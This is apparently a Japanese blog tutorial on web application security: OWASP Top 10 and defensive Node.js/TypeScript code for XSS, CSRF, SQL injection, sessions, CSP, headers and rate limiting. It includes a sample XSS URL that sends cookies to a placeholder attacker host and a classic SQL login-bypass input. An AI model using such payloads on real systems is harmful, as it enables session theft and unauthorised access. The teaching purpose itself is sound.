---
title: 'Webセキュリティ完全ガイド — OWASP Top 10・XSS・CSRF・SQLi・CSP実装'
description: 'Webアプリケーションセキュリティを完全解説。OWASP Top 10・XSS/CSRF防御・SQLインジェクション・認証セキュリティ・CSP・HTTPS設定・セキュリティヘッダー・脆弱性スキャンまで実装例付きで網羅。'
pubDate: 'Feb 20 2026'
heroImage: '../../assets/blog-placeholder-5.jpg'
tags: ['セキュリティ', 'OWASP', 'XSS', 'CSRF', 'Node.js']
---

Webアプリケーションのセキュリティは、現代の開発において最も重要な関心事のひとつです。毎年数千件以上の脆弱性が報告され、データ漏洩・不正アクセス・サービス停止による被害は世界規模で数兆円に達しています。本記事では、業界標準である **OWASP Top 10（2021年版）** を軸に、XSS・CSRF・SQLインジェクションといった代表的な攻撃手法と防御実装を、Node.js/TypeScript のコード例とともに体系的に解説します。

---

## 1. OWASP Top 10（2021）とは

**OWASP（Open Web Application Security Project）** は、Webアプリケーションセキュリティに関するオープンなコミュニティです。その中核ドキュメントである **OWASP Top 10** は、最も一般的かつ深刻なWebアプリケーションの脆弱性カテゴリを3〜4年ごとに更新して公表しています。

2021年版では以下の10カテゴリが選定されました。

| # | カテゴリ | 概要 |
|---|---------|------|
| A01 | アクセス制御の失敗 | 権限外のリソースへのアクセス |
| A02 | 暗号化の失敗 | 機密データの平文保存・転送 |
| A03 | インジェクション | SQLi・コマンドインジェクション・XSS |
| A04 | 安全でない設計 | 脅威モデル・セキュアデザインの欠如 |
| A05 | セキュリティの設定ミス | デフォルト設定・不要機能の放置 |
| A06 | 脆弱で古いコンポーネント | 既知脆弱性を持つライブラリ使用 |
| A07 | 認証・識別の失敗 | ブルートフォース・クレデンシャルスタッフィング |
| A08 | ソフトウェアとデータの整合性の失敗 | CI/CDパイプライン汚染・安全でないデシリアライゼーション |
| A09 | セキュリティログと監視の失敗 | 不十分なログ・インシデント検知の欠如 |
| A10 | サーバーサイドリクエストフォージェリ（SSRF） | 内部ネットワークへの不正アクセス |

### なぜ OWASP Top 10 を基準にするのか

OWASP Top 10 はPCI DSS・ISO 27001・NIST などの主要なコンプライアンスフレームワークでも参照されており、セキュリティ要件定義の共通言語として機能します。開発チームがセキュリティリスクを議論する際の出発点として、非常に実用的です。

---

## 2. XSS（クロスサイトスクリプティング）

### 2-1. 3種類のXSS

**反射型 XSS（Reflected XSS）**  
攻撃者が細工したURLをユーザーに踏ませ、レスポンスに含まれるスクリプトを実行させます。

```
https://example.com/search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
```

**蓄積型 XSS（Stored XSS）**  
悪意あるスクリプトをデータベースに保存し、他のユーザーが閲覧した際に実行されます。コメント欄・プロフィール・掲示板などが典型的な攻撃面です。

**DOM型 XSS（DOM-based XSS）**  
サーバーを介さず、クライアントサイドのJavaScriptがDOM操作を通じてスクリプトを挿入します。`document.write()`・`innerHTML`・`eval()` の不適切な利用が原因になります。

### 2-2. XSS防御の実装

#### 出力エンコーディング

HTMLコンテキストに動的な値を挿入する際は必ずエスケープします。

```typescript
// lib/security/escape.ts
export function escapeHtml(unsafe: string): string {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// 使用例
const userInput = req.query.name as string;
const safeOutput = escapeHtml(userInput);
res.send(`<p>こんにちは、${safeOutput}さん</p>`);
```

#### DOMPurify による HTML サニタイゼーション

ユーザー入力のリッチテキスト（HTMLを許可するケース）を扱う場合は **DOMPurify** を使用します。

```typescript
// クライアントサイド
import DOMPurify from 'dompurify';

function renderUserContent(dirtyHtml: string): void {
  const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'title', 'rel'],
    // javascript: スキームを禁止
    FORCE_HTTPS: true,
  });
  document.getElementById('content')!.innerHTML = cleanHtml;
}

// サーバーサイド（Node.js）
import { JSDOM } from 'jsdom';
import DOMPurify from 'dompurify';

const window = new JSDOM('').window;
const purify = DOMPurify(window as unknown as Window);

export function sanitizeHtml(dirty: string): string {
  return purify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
    ALLOWED_ATTR: ['href', 'rel'],
  });
}
```

#### テンプレートエンジンの自動エスケープ

React・Vue・Angular などのモダンフレームワークは、デフォルトで出力をエスケープします。ただし `dangerouslySetInnerHTML`（React）・`v-html`（Vue）の使用は原則禁止し、どうしても必要な場合は DOMPurify でサニタイズ後に使用します。

```tsx
// React: 危険な書き方（避ける）
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// React: 安全な書き方
import DOMPurify from 'dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
```

---

## 3. CSRF（クロスサイトリクエストフォージェリ）

### 3-1. CSRF の仕組み

CSRF は、認証済みユーザーのセッションを悪用して、意図しないリクエストを送信させる攻撃です。

```
1. ユーザーが bank.example.com にログイン（セッションCookie保持）
2. 攻撃者サイトにアクセス
3. 攻撃者サイトが自動的に bank.example.com/transfer へ POST リクエスト
4. ブラウザがCookieを自動付与 → 送金が実行される
```

### 3-2. CSRF 防御：SameSite Cookie

**SameSite** 属性は最も効果的な CSRF 対策のひとつです。

```typescript
// Express でのセッションCookie設定
import session from 'express-session';

app.use(session({
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,      // JavaScriptからアクセス不可
    secure: true,        // HTTPS のみ
    sameSite: 'strict',  // 同一サイトリクエストのみCookieを送信
    maxAge: 1000 * 60 * 60 * 24, // 24時間
  },
}));
```

`sameSite: 'strict'` は最も厳格で、外部サイトからのリクエストにはCookieが一切送信されません。外部サイトからのリンク遷移でもCookieが送られないため、ユーザビリティとのトレードオフがあります。その場合は `'lax'`（GETリクエストは許可）を検討してください。

### 3-3. CSRF トークンによる二重確認

SameSite に加え、CSRFトークンを実装することで多層防御を構成します。

```typescript
// middleware/csrf.ts
import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

// CSRFトークン生成
export function generateCsrfToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// トークン検証ミドルウェア
export function csrfProtection(req: Request, res: Response, next: NextFunction): void {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) {
    return next();
  }

  const sessionToken = req.session.csrfToken;
  const requestToken = req.headers['x-csrf-token'] ?? req.body._csrf;

  if (!sessionToken || !requestToken) {
    res.status(403).json({ error: 'CSRF token missing' });
    return;
  }

  // タイミング攻撃を防ぐための定数時間比較
  const sessionBuffer = Buffer.from(sessionToken, 'hex');
  const requestBuffer = Buffer.from(requestToken as string, 'hex');

  if (
    sessionBuffer.length !== requestBuffer.length ||
    !crypto.timingSafeEqual(sessionBuffer, requestBuffer)
  ) {
    res.status(403).json({ error: 'Invalid CSRF token' });
    return;
  }

  // トークンを使い捨てにする（ダブルサブミット防止）
  req.session.csrfToken = generateCsrfToken();
  next();
}

// ルーター設定
app.use(csrfProtection);

// トークン配布エンドポイント
app.get('/api/csrf-token', (req, res) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCsrfToken();
  }
  res.json({ token: req.session.csrfToken });
});
```

フロントエンド側での使用例：

```typescript
// フロントエンド: CSRFトークン取得と使用
async function fetchCsrfToken(): Promise<string> {
  const res = await fetch('/api/csrf-token', { credentials: 'include' });
  const { token } = await res.json();
  return token;
}

async function submitForm(data: object): Promise<void> {
  const csrfToken = await fetchCsrfToken();

  await fetch('/api/sensitive-action', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
    credentials: 'include',
    body: JSON.stringify(data),
  });
}
```

---

## 4. SQLインジェクション

### 4-1. 攻撃パターン

```sql
-- 脆弱なクエリ例
SELECT * FROM users WHERE username = '${username}' AND password = '${password}'

-- 攻撃入力
username: admin'--
password: anything

-- 実行されるクエリ（パスワード検証がスキップされる）
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

### 4-2. Prepared Statements（プリペアドステートメント）

SQLiの最も効果的な防御は **プリペアドステートメント** の徹底使用です。

```typescript
// ❌ 危険: 文字列結合
const query = `SELECT * FROM users WHERE email = '${email}'`;
const result = await db.query(query);

// ✅ 安全: プリペアドステートメント（node-postgres）
import { Pool } from 'pg';
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

async function getUserByEmail(email: string) {
  const result = await pool.query(
    'SELECT id, name, email FROM users WHERE email = $1',
    [email]  // パラメータは必ず配列で渡す
  );
  return result.rows[0] ?? null;
}

// IN句での複数パラメータ
async function getUsersByIds(ids: number[]) {
  const placeholders = ids.map((_, i) => `$${i + 1}`).join(', ');
  const result = await pool.query(
    `SELECT * FROM users WHERE id IN (${placeholders})`,
    ids
  );
  return result.rows;
}
```

### 4-3. ORM（Prisma）によるSQLi防御

Prisma などのORMは内部でプリペアドステートメントを使用するため、パラメータ化クエリが自動的に適用されます。

```typescript
// prisma/schema.prisma
// generator, datasource の設定は省略

// ✅ Prisma: 自動的にパラメータ化される
import { PrismaClient } from '@prisma/client';
const prisma = new PrismaClient();

// 安全なユーザー検索
async function findUser(email: string) {
  return prisma.user.findUnique({
    where: { email },
    select: { id: true, name: true, email: true }, // 必要なフィールドのみ取得
  });
}

// 検索フィルタリング
async function searchProducts(keyword: string, categoryId: number) {
  return prisma.product.findMany({
    where: {
      AND: [
        { categoryId },
        {
          OR: [
            { name: { contains: keyword, mode: 'insensitive' } },
            { description: { contains: keyword, mode: 'insensitive' } },
          ],
        },
      ],
    },
  });
}

// ⚠️ 注意: Prisma の $queryRaw は使い方に気をつける
// ❌ 危険
const result = await prisma.$queryRaw`SELECT * FROM users WHERE name = ${Prisma.raw(userInput)}`;

// ✅ 安全: テンプレートリテラルはPrismaが自動エスケープ
const result = await prisma.$queryRaw`SELECT * FROM users WHERE name = ${userInput}`;
```

---

## 5. 認証セキュリティ

### 5-1. パスワードハッシュ（bcrypt）

パスワードは絶対に平文保存してはいけません。**bcrypt** または **Argon2** を使用します。

```typescript
// auth/password.ts
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12; // 本番環境では10〜12推奨

// パスワードハッシュ化
export async function hashPassword(plaintext: string): Promise<string> {
  return bcrypt.hash(plaintext, SALT_ROUNDS);
}

// パスワード検証（タイミング攻撃対策済み）
export async function verifyPassword(
  plaintext: string,
  hash: string
): Promise<boolean> {
  return bcrypt.compare(plaintext, hash);
}

// 使用例: ユーザー登録
async function registerUser(email: string, password: string): Promise<void> {
  // パスワード強度チェック
  validatePasswordStrength(password);

  const hashedPassword = await hashPassword(password);

  await prisma.user.create({
    data: {
      email,
      password: hashedPassword,
    },
  });
}

// パスワード強度バリデーション
function validatePasswordStrength(password: string): void {
  if (password.length < 12) {
    throw new Error('パスワードは12文字以上必要です');
  }
  if (!/[A-Z]/.test(password)) {
    throw new Error('大文字を含める必要があります');
  }
  if (!/[a-z]/.test(password)) {
    throw new Error('小文字を含める必要があります');
  }
  if (!/[0-9]/.test(password)) {
    throw new Error('数字を含める必要があります');
  }
  if (!/[^A-Za-z0-9]/.test(password)) {
    throw new Error('記号を含める必要があります');
  }
}
```

### 5-2. TOTP による 2FA（二要素認証）

```typescript
// auth/totp.ts
import { authenticator } from 'otplib';
import qrcode from 'qrcode';

// TOTPシークレット生成
export function generateTotpSecret(): string {
  return authenticator.generateSecret();
}

// QRコード生成（Google Authenticator等で読み込み）
export async function generateQrCode(
  email: string,
  secret: string
): Promise<string> {
  const otpauthUrl = authenticator.keyuri(email, 'MyApp', secret);
  return qrcode.toDataURL(otpauthUrl);
}

// TOTPトークン検証
export function verifyTotpToken(token: string, secret: string): boolean {
  return authenticator.verify({ token, secret });
}

// 2FA有効化フロー
async function enable2fa(userId: string) {
  const secret = generateTotpSecret();

  // シークレットをDBに保存（まだ未検証状態）
  await prisma.user.update({
    where: { id: userId },
    data: { totpSecret: secret, totpEnabled: false },
  });

  const user = await prisma.user.findUnique({ where: { id: userId } });
  const qrCode = await generateQrCode(user!.email, secret);

  return { secret, qrCode };
}

// 2FA検証と有効化確定
async function confirm2fa(userId: string, token: string) {
  const user = await prisma.user.findUnique({ where: { id: userId } });
  if (!user?.totpSecret) throw new Error('2FA setup not started');

  if (!verifyTotpToken(token, user.totpSecret)) {
    throw new Error('Invalid TOTP token');
  }

  await prisma.user.update({
    where: { id: userId },
    data: { totpEnabled: true },
  });
}
```

---

## 6. セッション管理

### 6-1. セキュアな Cookie 設定

```typescript
// middleware/session.ts
import session from 'express-session';
import RedisStore from 'connect-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL!);
const redisStore = new RedisStore({ client: redis, prefix: 'sess:' });

export const sessionMiddleware = session({
  store: redisStore,
  secret: process.env.SESSION_SECRET!, // 32バイト以上のランダム文字列
  name: '__Host-sid',   // __Host- プレフィックスで追加セキュリティ
  resave: false,
  saveUninitialized: false,
  rolling: true,         // アクティビティがあるたびにタイムアウトをリセット
  cookie: {
    httpOnly: true,      // XSSによるCookie盗取を防止
    secure: true,        // HTTPS接続のみでCookieを送信
    sameSite: 'strict',  // CSRF対策
    maxAge: 30 * 60 * 1000, // 30分
    path: '/',
  },
});

// セッション固定攻撃対策: ログイン後にセッションIDを再生成
export async function regenerateSession(req: Request): Promise<void> {
  return new Promise((resolve, reject) => {
    req.session.regenerate((err) => {
      if (err) reject(err);
      else resolve();
    });
  });
}

// ログイン処理でのセッション再生成
async function login(req: Request, res: Response) {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);

  // ログイン前のセッションIDを再生成（固定攻撃対策）
  await regenerateSession(req);

  req.session.userId = user.id;
  req.session.role = user.role;

  res.json({ success: true });
}
```

### 6-2. JWT のセキュアな実装

```typescript
// auth/jwt.ts
import jwt from 'jsonwebtoken';
import { randomUUID } from 'crypto';

interface TokenPayload {
  sub: string;      // subject（ユーザーID）
  role: string;
  jti: string;      // JWT ID（リボーク用）
  iat?: number;
  exp?: number;
}

const ACCESS_TOKEN_EXPIRY = '15m';   // アクセストークンは短命に
const REFRESH_TOKEN_EXPIRY = '7d';  // リフレッシュトークンは長め

// アクセストークン生成
export function generateAccessToken(userId: string, role: string): string {
  return jwt.sign(
    { sub: userId, role, jti: randomUUID() },
    process.env.JWT_SECRET!,
    { expiresIn: ACCESS_TOKEN_EXPIRY, algorithm: 'HS256' }
  );
}

// トークン検証
export function verifyToken(token: string): TokenPayload {
  try {
    return jwt.verify(token, process.env.JWT_SECRET!) as TokenPayload;
  } catch (err) {
    if (err instanceof jwt.TokenExpiredError) {
      throw new Error('Token expired');
    }
    if (err instanceof jwt.JsonWebTokenError) {
      throw new Error('Invalid token');
    }
    throw err;
  }
}

// JWTをHTTPOnly Cookieで送る（LocalStorageはXSSに脆弱）
export function setTokenCookie(res: Response, token: string): void {
  res.cookie('access_token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000, // 15分
  });
}
```

---

## 7. CSP（Content Security Policy）

CSP はXSS攻撃を大幅に緩和するHTTPレスポンスヘッダーです。ブラウザが読み込めるリソースのソースを制限します。

### 7-1. CSP ヘッダーの設定

```typescript
// middleware/csp.ts
import helmet from 'helmet';

// Helmet を使った包括的なセキュリティヘッダー設定
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: [
          "'self'",
          // インラインスクリプトを許可する場合（nonce推奨）
          // "'unsafe-inline'", // ← 本番では避ける
          'https://cdn.jsdelivr.net',
        ],
        styleSrc: [
          "'self'",
          "'unsafe-inline'", // CSSフレームワーク使用時は必要なことが多い
          'https://fonts.googleapis.com',
        ],
        fontSrc: ["'self'", 'https://fonts.gstatic.com'],
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'", 'https://api.example.com'],
        frameSrc: ["'none'"],       // iframeの埋め込みを禁止
        objectSrc: ["'none'"],      // Flash等のプラグインを禁止
        baseUri: ["'self'"],        // base タグのURLを制限
        formAction: ["'self'"],     // フォーム送信先を制限
        upgradeInsecureRequests: [], // HTTP→HTTPSへ自動アップグレード
      },
      reportOnly: false, // trueにするとレポートのみ（ブロックしない）
    },
  })
);
```

### 7-2. Nonce ベースの CSP（推奨）

`'unsafe-inline'` を避け、nonce を使用することでインラインスクリプトを安全に許可できます。

```typescript
// middleware/csp-nonce.ts
import crypto from 'crypto';

export function cspNonce(req: Request, res: Response, next: NextFunction): void {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.cspNonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    [
      `default-src 'self'`,
      `script-src 'self' 'nonce-${nonce}'`,
      `style-src 'self' 'nonce-${nonce}'`,
      `img-src 'self' data: https:`,
      `connect-src 'self' https://api.example.com`,
      `frame-src 'none'`,
      `object-src 'none'`,
    ].join('; ')
  );

  next();
}

// テンプレートでの使用（EJS等）
// <script nonce="<%= cspNonce %>">...</script>
```

---

## 8. セキュリティヘッダー

CSP 以外にも、設定すべき重要なセキュリティヘッダーが多数あります。

```typescript
// middleware/security-headers.ts
import helmet from 'helmet';

app.use(
  helmet({
    // クリックジャッキング防止
    frameguard: { action: 'deny' },

    // HTTPS強制（HSTS）
    hsts: {
      maxAge: 31536000,        // 1年
      includeSubDomains: true, // サブドメインも含む
      preload: true,           // HSTSプリロードリストへの登録申請可能に
    },

    // MIMEタイプスニッフィング防止
    noSniff: true,

    // XSS保護（レガシーブラウザ向け）
    xssFilter: true,

    // Referrer ポリシー
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },

    // Permissions Policy（旧Feature-Policy）
    permittedCrossDomainPolicies: { permittedPolicies: 'none' },
  })
);

// Permissions-Policy ヘッダー（Helmetが未対応の場合は手動設定）
app.use((_req, res, next) => {
  res.setHeader(
    'Permissions-Policy',
    [
      'camera=()',          // カメラアクセスを禁止
      'microphone=()',      // マイクアクセスを禁止
      'geolocation=()',     // 位置情報アクセスを禁止
      'interest-cohort=()', // FLoC無効化（プライバシー）
    ].join(', ')
  );
  next();
});

// Cross-Origin Isolation ヘッダー（SharedArrayBuffer使用時に必要）
app.use((_req, res, next) => {
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  next();
});
```

### セキュリティヘッダー確認ツール

設定後は [securityheaders.com](https://securityheaders.com/) でスコアを確認できます。A+評価を目標にしましょう。

---

## 9. 入力検証とサニタイゼーション（zod）

すべての外部入力は「信頼できない」と見なし、サーバーサイドで必ず検証します。

```typescript
// validation/schemas.ts
import { z } from 'zod';

// ユーザー登録スキーマ
export const registerSchema = z.object({
  email: z
    .string()
    .email('有効なメールアドレスを入力してください')
    .max(255)
    .toLowerCase(),
  password: z
    .string()
    .min(12, 'パスワードは12文字以上必要です')
    .max(128)
    .regex(/[A-Z]/, '大文字を含めてください')
    .regex(/[a-z]/, '小文字を含めてください')
    .regex(/[0-9]/, '数字を含めてください')
    .regex(/[^A-Za-z0-9]/, '記号を含めてください'),
  name: z
    .string()
    .min(1)
    .max(100)
    .trim()
    .regex(/^[a-zA-Z\u3040-\u9FFF\s]+$/, '有効な名前を入力してください'),
});

// 検索クエリスキーマ
export const searchSchema = z.object({
  q: z.string().max(200).trim().optional(),
  page: z.coerce.number().int().positive().default(1),
  limit: z.coerce.number().int().min(1).max(100).default(20),
  sort: z.enum(['asc', 'desc']).default('desc'),
});

// バリデーションミドルウェア
import { AnyZodObject, ZodError } from 'zod';

export function validate(schema: AnyZodObject) {
  return async (req: Request, res: Response, next: NextFunction) => {
    try {
      req.body = await schema.parseAsync(req.body);
      next();
    } catch (err) {
      if (err instanceof ZodError) {
        res.status(400).json({
          error: 'Validation failed',
          details: err.errors.map((e) => ({
            field: e.path.join('.'),
            message: e.message,
          })),
        });
        return;
      }
      next(err);
    }
  };
}

// ルートでの使用
app.post('/api/register', validate(registerSchema), registerHandler);
```

---

## 10. 依存関係の脆弱性管理

### 10-1. npm audit

```bash
# 脆弱性スキャン
npm audit

# 自動修正（minor/patchのみ）
npm audit fix

# 詳細レポート出力
npm audit --json > audit-report.json

# CI/CD での使用（高・致命的な脆弱性でビルド失敗）
npm audit --audit-level=high
```

### 10-2. Snyk による継続的スキャン

```bash
# Snyk CLI インストール
npm install -g snyk

# 認証
snyk auth

# テスト
snyk test

# モニタリング（定期スキャン登録）
snyk monitor
```

### 10-3. Dependabot 設定

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Asia/Tokyo"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
    # セキュリティアップデートは自動マージ
    groups:
      security-updates:
        applies-to: security-updates
        patterns:
          - "*"
```

### 10-4. パッケージロックファイルの管理

```bash
# package-lock.json は必ずコミットする
# これにより再現可能なビルドと依存関係の固定が保証される

# CI ではnpm install ではなく npm ci を使用（lockfile厳守）
npm ci
```

---

## 11. Rate Limiting と DDoS 対策

### 11-1. express-rate-limit

```typescript
// middleware/rate-limit.ts
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL!);

// 一般的なAPIリミット
export const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分
  max: 100,                  // 100リクエストまで
  standardHeaders: true,     // RateLimit-* ヘッダーを返す
  legacyHeaders: false,
  store: new RedisStore({
    sendCommand: (...args: string[]) => redis.call(...args),
  }),
  handler: (_req, res) => {
    res.status(429).json({
      error: 'Too many requests. Please try again later.',
      retryAfter: Math.ceil(15 * 60),
    });
  },
});

// ログインエンドポイント向けの厳格なリミット
export const loginLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1時間
  max: 10,                   // 10回まで（ブルートフォース防止）
  skipSuccessfulRequests: true, // 成功したリクエストはカウントしない
  store: new RedisStore({
    sendCommand: (...args: string[]) => redis.call(...args),
  }),
  keyGenerator: (req) => {
    // IPアドレスとメールアドレスの組み合わせでキー生成
    return `${req.ip}-${req.body.email ?? 'unknown'}`;
  },
});

// APIルートに適用
app.use('/api/', apiLimiter);
app.post('/api/auth/login', loginLimiter);
```

### 11-2. Cloudflare WAF の活用

インフラレベルでは **Cloudflare** の利用が効果的です。

- **WAF（Web Application Firewall）**: SQLi・XSS・LFI等の既知攻撃パターンをエッジでブロック
- **DDoS Protection**: L3/L4/L7 DDoS を自動緩和
- **Bot Fight Mode**: 悪意あるボットをブロック
- **Rate Limiting Rules**: IPベースのレート制限をCloudflare側で設定

```typescript
// Cloudflare の信頼するIPからのヘッダーのみ使用
// CF-Connecting-IP は Cloudflare からのみ信頼する
app.set('trust proxy', ['loopback', 'uniquelocal']);

// Cloudflare レイヤー背後でのリアルIP取得
function getClientIp(req: Request): string {
  const cfIp = req.headers['cf-connecting-ip'];
  if (cfIp && typeof cfIp === 'string') {
    return cfIp;
  }
  return req.ip ?? '0.0.0.0';
}
```

---

## 12. 機密情報管理

### 12-1. 環境変数の管理

```typescript
// config/env.ts
import { z } from 'zod';

// 環境変数の型安全な検証
const envSchema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']),
  DATABASE_URL: z.string().url(),
  SESSION_SECRET: z.string().min(32, 'SESSION_SECRET は32文字以上必要'),
  JWT_SECRET: z.string().min(32, 'JWT_SECRET は32文字以上必要'),
  REDIS_URL: z.string().url(),
  ENCRYPTION_KEY: z.string().length(64, 'ENCRYPTION_KEY は64文字（32バイト hex）'),
});

function validateEnv() {
  const result = envSchema.safeParse(process.env);
  if (!result.success) {
    console.error('環境変数の検証エラー:');
    console.error(result.error.format());
    process.exit(1); // 不正な設定での起動を防止
  }
  return result.data;
}

export const env = validateEnv();
```

### 12-2. シークレットの暗号化（保存時）

```typescript
// lib/encryption.ts
import crypto from 'crypto';

const ALGORITHM = 'aes-256-gcm';
const KEY = Buffer.from(process.env.ENCRYPTION_KEY!, 'hex');

// 暗号化
export function encrypt(plaintext: string): string {
  const iv = crypto.randomBytes(12); // GCM では12バイトのIV
  const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);

  const encrypted = Buffer.concat([
    cipher.update(plaintext, 'utf8'),
    cipher.final(),
  ]);
  const tag = cipher.getAuthTag(); // 認証タグ（改ざん検知）

  // iv + tag + encrypted をbase64で返す
  return Buffer.concat([iv, tag, encrypted]).toString('base64');
}

// 復号
export function decrypt(ciphertext: string): string {
  const data = Buffer.from(ciphertext, 'base64');
  const iv = data.subarray(0, 12);
  const tag = data.subarray(12, 28);
  const encrypted = data.subarray(28);

  const decipher = crypto.createDecipheriv(ALGORITHM, KEY, iv);
  decipher.setAuthTag(tag);

  return Buffer.concat([
    decipher.update(encrypted),
    decipher.final(),
  ]).toString('utf8');
}
```

### 12-3. git-secrets による誤コミット防止

```bash
# git-secrets のインストール（macOS）
brew install git-secrets

# リポジトリへの設定
git secrets --install
git secrets --register-aws  # AWS認証情報パターンを登録

# カスタムパターンの追加
git secrets --add 'password\s*=\s*.+'
git secrets --add 'api_key\s*=\s*.+'
git secrets --add 'secret\s*=\s*.+'

# コミット前に自動スキャン
git secrets --scan
```

---

## 13. セキュリティテスト

### 13-1. OWASP ZAP（Zed Attack Proxy）

OWASP ZAP は無料のWebアプリケーションセキュリティスキャナーです。

```bash
# Docker でZAP起動
docker pull ghcr.io/zaproxy/zaproxy:stable

# ベースラインスキャン（受動的スキャンのみ）
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://staging.example.com \
  -r zap-report.html

# フルスキャン（アクティブスキャン含む）
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-full-scan.py \
  -t https://staging.example.com \
  -r zap-full-report.html

# CI/CD パイプラインへの組み込み（GitHub Actions）
# jobs.security-scan.steps に追加
```

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main, develop]
  schedule:
    - cron: '0 3 * * 1'  # 毎週月曜3時

jobs:
  zap-scan:
    runs-on: ubuntu-latest
    steps:
      - name: ZAP Baseline Scan
        uses: zaproxy/action-baseline@v0.10.0
        with:
          target: 'https://staging.example.com'
          rules_file_name: '.zap/rules.tsv'
          cmd_options: '-a'

  dependency-audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm audit --audit-level=high
```

### 13-2. Burp Suite 基礎

Burp Suite は業界標準のWebセキュリティテストツールです。

**基本的な使い方**

1. **プロキシ設定**: ブラウザのプロキシを `127.0.0.1:8080` に設定
2. **インターセプト**: リクエスト/レスポンスをキャプチャして検査
3. **Repeater**: リクエストを手動で編集・再送してレスポンスを確認
4. **Intruder**: ペイロードリストによるファジング・ブルートフォーステスト
5. **Scanner**: 自動脆弱性スキャン（Pro版）

**セキュリティテストのチェックリスト**

```markdown
## セキュリティテストチェックリスト

### 認証
- [ ] ブルートフォース対策（レート制限）が動作しているか
- [ ] アカウントロックアウト機能があるか
- [ ] パスワードリセットフローに脆弱性はないか（トークン推測可能性等）
- [ ] セッションIDがログイン後に再生成されるか
- [ ] ログアウト後にセッションが無効化されるか

### 認可
- [ ] 水平権限昇格（他ユーザーのリソースへのアクセス）が不可能か
- [ ] 垂直権限昇格（管理者機能への不正アクセス）が不可能か
- [ ] 直接オブジェクト参照（IDOR）に対する検証があるか

### データ検証
- [ ] すべての入力フィールドにサーバーサイドバリデーションがあるか
- [ ] SQLインジェクションに対して安全か
- [ ] XSSに対して安全か（反射型・蓄積型・DOM型）
- [ ] ファイルアップロード機能でファイルタイプ検証があるか

### セキュリティヘッダー
- [ ] CSP が設定されているか
- [ ] HSTS が設定されているか
- [ ] X-Frame-Options が設定されているか
- [ ] X-Content-Type-Options が設定されているか
```

### 13-3. セキュリティ監査ログの実装

```typescript
// lib/audit-log.ts
import { createLogger, format, transports } from 'winston';

const auditLogger = createLogger({
  level: 'info',
  format: format.combine(
    format.timestamp(),
    format.json()
  ),
  transports: [
    new transports.File({ filename: 'logs/audit.log' }),
    // 本番では CloudWatch Logs や Datadog に転送
  ],
});

// セキュリティイベントの記録
export function logSecurityEvent(
  eventType: string,
  userId: string | null,
  details: Record<string, unknown>,
  req: Request
): void {
  auditLogger.info({
    eventType,
    userId,
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    method: req.method,
    path: req.path,
    timestamp: new Date().toISOString(),
    ...details,
  });
}

// 使用例
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  try {
    const user = await authenticateUser(email, password);
    logSecurityEvent('LOGIN_SUCCESS', user.id, { email }, req);
    // ...
  } catch {
    logSecurityEvent('LOGIN_FAILURE', null, { email, reason: 'Invalid credentials' }, req);
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

---

## セキュリティ実装まとめ

本記事で解説した防御策を、重要度と実装難易度で整理します。

| 対策 | 重要度 | 実装コスト | 効果 |
|------|--------|-----------|------|
| Prepared Statements | 最高 | 低 | SQLi 完全防御 |
| bcrypt パスワードハッシュ | 最高 | 低 | 漏洩時の被害最小化 |
| HTTPS + HSTS | 最高 | 低 | 通信の暗号化・MitM防止 |
| HttpOnly + Secure Cookie | 最高 | 低 | XSSによるCookie盗取防止 |
| SameSite Cookie | 高 | 低 | CSRF防御 |
| CSP ヘッダー | 高 | 中 | XSS緩和 |
| 入力検証（zod） | 高 | 低 | インジェクション全般防御 |
| Rate Limiting | 高 | 低 | ブルートフォース・DDoS緩和 |
